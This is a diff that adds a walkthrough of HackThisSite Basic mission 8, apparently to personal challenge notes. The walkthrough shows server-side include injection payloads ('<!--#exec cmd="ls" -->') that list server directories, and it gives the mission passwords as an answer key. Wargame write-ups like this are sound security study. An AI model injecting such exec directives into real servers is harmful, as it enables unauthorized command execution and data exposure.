@@ -32,6 +32,34 @@ We check k1kh31b1n55h.php file from the browser so /k1kh31b1n55h.php: 62832940
 
 Password: f866d6b9. Attempt: 1 Success:1
 
+Basic Series
+Basic 8
+
+The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP, and has a small script to demonstrate her knowledge. Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)
+
+Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/
+
+However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.
+
+req: SSI
+metd: SSI
+
+So the simple command that does that is <!--#exec cmd="ls" --> 
+Which gives us a directory listing of inside the /tmp/ directory. To proceed one level up, simply <!--#exec cmd="ls ../" --> ls one directory up
+
+Output: au12ha39vc.php index.php level8.php tmp! Check the file via browser: 569c6328
+
+Password: 569c6328. Attempt: 1 Success: 1
+
+
+
+
+
+
+
+
+
+
 
 
 
